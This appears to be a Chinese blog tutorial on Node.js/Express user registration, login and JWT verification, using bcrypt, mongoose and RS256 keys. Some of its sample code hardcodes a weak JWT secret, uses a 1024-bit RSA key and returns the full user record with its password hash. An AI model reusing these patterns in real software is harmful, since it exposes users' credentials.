href="https://www.oschina.net/action/GoToLink?url=http%3A%2F%2Fwww.cnblogs.com%2Fshanyou%2Fp%2F5038794.html">CSRF 攻击</a>（又引出一个知识点，推荐<a href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">文章</a>，<strong>前端知识真是如同太平洋广，如同马里亚纳海沟深</strong>）</li><li>Token 可以是无状态的，可以在多个服务间共享</li></ol><h3 id="其它（cookie、session、token）"><a href="#其它（cookie、session、token）" class="headerlink" title="其它（cookie、session、token）"></a>其它（cookie、session、token）</h3><p>本实验主要采用token进行前后端验证，但是同时也有必要了解其他验证方式的原理，推荐看看下面的文章</p><blockquote><p>博客链接：<a href="https://juejin.cn/post/6898630134530752520">🔺🔺🔺前端鉴权的兄弟们：cookie、session、token、jwt、单点登录 - 掘金 (juejin.cn)</a>，通过该博客，你可了解到</p><ol><li>基于 HTTP 的前端鉴权背景</li><li>cookie 为什么是最方便的存储方案，有哪些操作 cookie 的方式</li><li>session 方案是如何实现的，存在哪些问题</li><li>token 方案是如何实现的，如何进行编码和防篡改？jwt 是做什么的？refresh token 的实现和意义</li><li>session 和 token 有什么异同和优缺点</li><li>单点登录是什么？实现思路和在浏览器下的处理</li></ol></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>参考视频（强烈建议看，逻辑清晰，几乎不带一句废话，虽然有点长）:<a href="https://www.bilibili.com/video/BV1Nb411j7AC?spm_id_from=333.337.search-card.all.click">1小时搞定NodeJs(Express)的用户注册、登录和授权_哔哩哔哩_bilibili🔺🔺🔺</a></p><p>步骤（该案例模拟的用户名为唯一值unique）</p><ol><li><p>相关模块以及初始化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); <span class="comment">//expree服务器</span></span><br><span class="line"><span class="keyword">const</span> bcrypt = <span class="built_in">require</span>(<span class="string">&#x27;bcrypt&#x27;</span>); <span class="comment">//加密</span></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>); <span class="comment">//token</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">User</span> = <span class="built_in">require</span>(<span class="string">&#x27;./User.js&#x27;</span>); <span class="comment">//用户模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">// 定义密钥进行token加密，也可通过openssl进行私钥公钥配对,后面有解释</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable constant_">SECRET</span> = <span class="string">&#x27;dongyuan666&#x27;</span>;</span><br><span class="line"><span class="comment">// 接收前端传递的json数据</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br></pre></td></tr></table></figure></li><li><p>用户名唯一，密码加密(User模块)</p><ul><li>bcrypt模块 -&gt; set函数 -&gt; <code>bcrypt.hashSync(val, number)</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">UserSchema</span> = <span class="keyword">new</span> mongoose.<span class="title class_">Schema</span>(&#123;</span><br><span class="line">  <span class="attr">username</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">unique</span>: <span class="literal">true</span> <span class="comment">//唯一值</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">password</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">set</span>: <span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> bcrypt.<span class="title function_">hashSync</span>(val, <span class="number">10</span>) <span class="comment">//加密</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>User完整代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bcrypt = <span class="built_in">require</span>(<span class="string">&#x27;bcrypt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://localhost:27017/test-token&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">useNewUrlParser</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">useCreateIndex</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UserSchema</span> = <span class="keyword">new</span> mongoose.<span class="title class_">Schema</span>(&#123;</span><br><span class="line">  <span class="attr">username</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">unique</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">password</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">set</span>: <span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> bcrypt.<span class="title function_">hashSync</span>(val, <span class="number">10</span>) <span class="comment">//加密</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = mongoose.<span class="title function_">model</span>(<span class="string">&#x27;User&#x27;</span>, <span class="title class_">UserSchema</span>)</span><br></pre></td></tr></table></figure></li><li><p>处理用户注册</p><ol><li>判断当前用户是否已被注册：<code>User.find(&#123; username: req.body.username,&#125;)</code></li><li>写入数据库：<code>User.create(&#123;username: req.body.username,password: req.body.password,&#125;)</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// console.log(req.body);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> users = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">find</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: req.<span class="property">body</span>.<span class="property">username</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (users.<span class="property">length</span> != <span class="number">0</span>) <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&#x27;该用户已注册&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: req.<span class="property">body</span>.<span class="property">username</span>,</span><br><span class="line">    <span class="attr">password</span>: req.<span class="property">body</span>.<span class="property">password</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;注册成功&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>处理用户登录</p><ol><li>判断数据库是否有当前用户：<code>User.findOne(&#123; username: body.username &#125;)</code></li><li>判断密码是否正确：<code>bcrypt.compareSync(body.password, user.password);</code></li><li>生成token：<code>jwt.sign(&#123;id&#125;, SECRET, &#123;options&#125;)</code><ul><li>定义SECRET：<code>let SECRET = &#39;自定义密钥内容&#39;;</code></li></ul></li><li>发送token</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable constant_">SECRET</span> = <span class="string">&#x27;自定义密钥内容&#x27;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> body = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//1.判断用户是否存在</span></span><br><span class="line">  <span class="keyword">let</span> user = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">username</span>: body.<span class="property">username</span> &#125;);</span><br><span class="line">  <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">422</span>).<span class="title function_">json</span>(&#123; <span class="attr">errorCode</span>: <span class="number">1</span>, <span class="attr">message</span>: <span class="string">&#x27;用户不存在&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用户存在</span></span><br><span class="line">  <span class="comment">// 2.密码校验</span></span><br><span class="line">  <span class="keyword">let</span> isPasswordValid = bcrypt.<span class="title function_">compareSync</span>(body.<span class="property">password</span>, user.<span class="property">password</span>);</span><br><span class="line">  <span class="keyword">if</span> (!isPasswordValid) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">422</span>).<span class="title function_">json</span>(&#123; <span class="attr">errorCode</span>: <span class="number">2</span>, <span class="attr">message</span>: <span class="string">&#x27;密码错误&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3.生成token</span></span><br><span class="line">  <span class="keyword">let</span> token = jwt.<span class="title function_">sign</span>(</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="title class_">String</span>(user.<span class="property">id</span>) &#125;, <span class="comment">//密码不要放进来，放一个唯一的东西就可以了</span></span><br><span class="line">    <span class="variable constant_">SECRET</span>, <span class="comment">//密钥</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">expiresIn</span>: <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>, <span class="comment">//24h后失效</span></span><br><span class="line">    &#125; <span class="comment">//配置项</span></span><br><span class="line">  );</span><br><span class="line">  res.<span class="title function_">send</span>(token);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>处理用户验证</p><ol><li>获取token：<code>req.headers.authorization</code></li><li>解析token：<code>jwt.verify(raw, SECRET)</code></li><li>查找用户：<code>User.findById(id)</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/profile&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 获取token</span></span><br><span class="line">  <span class="keyword">let</span> raw = <span class="title class_">String</span>(req.<span class="property">headers</span>.<span class="property">authorization</span>).<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="comment">// 解析token并获取id</span></span><br><span class="line">  <span class="keyword">let</span> id = jwt.<span class="title function_">verify</span>(raw, <span class="variable constant_">SECRET</span>).<span class="property">id</span>;</span><br><span class="line">  <span class="comment">// 查找用户</span></span><br><span class="line">  <span class="keyword">let</span> user = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findById</span>(id);</span><br><span class="line">  res.<span class="title function_">send</span>(user);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>将token验证过程拆解成中间件，并进行验证</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 中间件</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">auth</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// 获取token</span></span><br><span class="line">  <span class="keyword">let</span> raw = <span class="title class_">String</span>(req.<span class="property">headers</span>.<span class="property">authorization</span>).<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="comment">// 解析token并获取id</span></span><br><span class="line">  <span class="keyword">let</span> id = jwt.<span class="title function_">verify</span>(raw, <span class="variable constant_">SECRET</span>).<span class="property">id</span>;</span><br><span class="line">  <span class="comment">// 查找用户</span></span><br><span class="line">  req.<span class="property">user</span> = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findById</span>(id);</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/market&#x27;</span>, auth, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(req.<span class="property">user</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bcrypt = <span class="built_in">require</span>(<span class="string">&#x27;bcrypt&#x27;</span>); <span class="comment">//加密</span></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>); <span class="comment">//token</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">User</span> = <span class="built_in">require</span>(<span class="string">&#x27;./User.js&#x27;</span>); <span class="comment">//用户模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">// 定义密钥，也可通过openssl进行私钥公钥配对</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable constant_">SECRET</span> = <span class="string">&#x27;dongyuan666&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收前端传递的json数据</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;Ok&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// console.log(req.body);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> users = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">find</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: req.<span class="property">body</span>.<span class="property">username</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (users.<span class="property">length</span> != <span class="number">0</span>) <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&#x27;该用户已注册&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: req.<span class="property">body</span>.<span class="property">username</span>,</span><br><span class="line">    <span class="attr">password</span>: req.<span class="property">body</span>.<span class="property">password</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;注册成功&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> body = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//1.判断用户是否存在</span></span><br><span class="line">  <span class="keyword">let</span> user = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">username</span>: body.<span class="property">username</span> &#125;);</span><br><span class="line">  <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">422</span>).<span class="title function_">json</span>(&#123; <span class="attr">errorCode</span>: <span class="number">1</span>, <span class="attr">message</span>: <span class="string">&#x27;用户不存在&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用户存在</span></span><br><span class="line">  <span class="comment">// 2.密码校验</span></span><br><span class="line">  <span class="keyword">let</span> isPasswordValid = bcrypt.<span class="title function_">compareSync</span>(body.<span class="property">password</span>, user.<span class="property">password</span>);</span><br><span class="line">  <span class="keyword">if</span> (!isPasswordValid) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">422</span>).<span class="title function_">json</span>(&#123; <span class="attr">errorCode</span>: <span class="number">2</span>, <span class="attr">message</span>: <span class="string">&#x27;密码错误&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3.生成token</span></span><br><span class="line">  <span class="keyword">let</span> token = jwt.<span class="title function_">sign</span>(</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="title class_">String</span>(user.<span class="property">id</span>) &#125;, <span class="comment">//密码不要放进来，放一个唯一的东西就可以了</span></span><br><span class="line">    <span class="variable constant_">SECRET</span>, <span class="comment">//密钥</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">expiresIn</span>: <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>, <span class="comment">//24h后失效</span></span><br><span class="line">    &#125; <span class="comment">//配置项</span></span><br><span class="line">  );</span><br><span class="line">  res.<span class="title function_">send</span>(token);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/profile&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// return res.send(String(req.headers.authorization).split(&#x27; &#x27;))</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">let</span> raw = <span class="title class_">String</span>(req.<span class="property">headers</span>.<span class="property">authorization</span>).<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">let</span> id = jwt.<span class="title function_">verify</span>(raw, <span class="variable constant_">SECRET</span>).<span class="property">id</span>;</span><br><span class="line">  <span class="keyword">let</span> user = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findById</span>(id);</span><br><span class="line">  res.<span class="title function_">send</span>(user);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中间件</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">auth</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// 获取token</span></span><br><span class="line">  <span class="keyword">let</span> raw = <span class="title class_">String</span>(req.<span class="property">headers</span>.<span class="property">authorization</span>).<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="comment">// 解析token并获取id</span></span><br><span class="line">  <span class="keyword">let</span> id = jwt.<span class="title function_">verify</span>(raw, <span class="variable constant_">SECRET</span>).<span class="property">id</span>;</span><br><span class="line">  <span class="comment">// 查找用户</span></span><br><span class="line">  req.<span class="property">user</span> = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findById</span>(id);</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/market&#x27;</span>, auth, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(req.<span class="property">user</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;server is running&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="🔺非对称加密"><a href="#🔺非对称加密" class="headerlink" title="🔺非对称加密"></a>🔺非对称加密</h3><p><a href="https://juejin.cn/post/7062173044214595597#heading-9">在Node.Js中使用JWT实现Token用户验证🔺🔺🔺</a> or <a href="https://www.jianshu.com/p/48462fb34a8a">node token验证</a></p><blockquote><p>非对称加密：RS256</p><p>私钥（private key）：用于发布令牌</p><p>公钥（public key）：用于验证令牌</p></blockquote><p>非对称加密步骤</p><ol><li><p>使用openssl生成公钥私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl</span><br><span class="line">OpenSSL&gt; genrsa -out private.key 1024</span><br><span class="line">OpenSSL&gt; rsa -<span class="keyword">in</span> private.key -pubout -out public.key</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/15/node-token%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C%E9%AA%8C%E8%AF%81/image-20220328102415279.png" alt="image-20220328102415279"></p></li><li><p>新建一个文件用于读取密钥并导出（config.js）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PRIVATE_KEY</span> = fs.<span class="title function_">readFileSync</span>(path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./keys/private.key&#x27;</span>));</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PUBLIC_KEY</span> = fs.<span class="title function_">readFileSync</span>(path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./keys/public.key&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">PRIVATE_KEY</span> = <span class="variable constant_">PRIVATE_KEY</span>;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">PUBLIC_KEY</span> = <span class="variable constant_">PUBLIC_KEY</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>导入密钥（app.js）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">PRIVATE_KEY</span>, <span class="variable constant_">PUBLIC_KEY</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./config.js&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>使用私钥进行加密</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> token = jwt.<span class="title function_">sign</span>(</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="title class_">String</span>(user.<span class="property">id</span>) &#125;, <span class="comment">//密码不要放进来，放一个唯一的东西就可以了</span></span><br><span class="line">    <span class="variable constant_">PRIVATE_KEY</span>, <span class="comment">//私钥加密</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">expiresIn</span>: <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>, <span class="comment">//24h后失效</span></span><br><span class="line">      <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span>, <span class="comment">//非对称加密</span></span><br><span class="line">    &#125; <span class="comment">//配置项</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure></li><li><p>使用公钥进行解密</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt.<span class="title function_">verify</span>(raw, <span class="variable constant_">PUBLIC_KEY</span>, &#123; <span class="attr">algorithms</span>: [<span class="string">&#x27;RS256&#x27;</span>] &#125;)</span><br></pre></td></tr></table></figure><h2 id="Token安全之道"><a href="#Token安全之道" class="headerlink" title="Token安全之道"></a>Token安全之道</h2></li></ol><p>建议阅读：<a href="https://segmentfault.com/q/1010000021515464">token拷贝到别人电脑上，禁止授权</a>🔺</p><p>简短：</p><ol><li><a href="http://www.sankedan.com/detail/9/2463.html">关于 token 被盗取的问题</a></li><li><a href="https://blog.csdn.net/weixin_43644324/article/details/87895729">如果一个用户的 token 被其他用户劫持了，怎样解决这个安全问题</a></li></ol><p>实践：<a href="https://juejin.cn/post/6844903498329358349">注册、登录和 token 的安全之道</a></p>]]></content>
    
    <summary type="html">
    
      使用jsonwebtoken进行node端登陆注册验证
    
    </summary>
    
    
      <category term="Node.js" scheme="http://Dong-666.github.io/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://Dong-666.github.io/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB数据入库</title>
    <link href="http://dong-666.github.io/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/"/>
    <id>http://dong-666.github.io/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/</id>
    <published>2022-04-10T07:20:10.000Z</published>
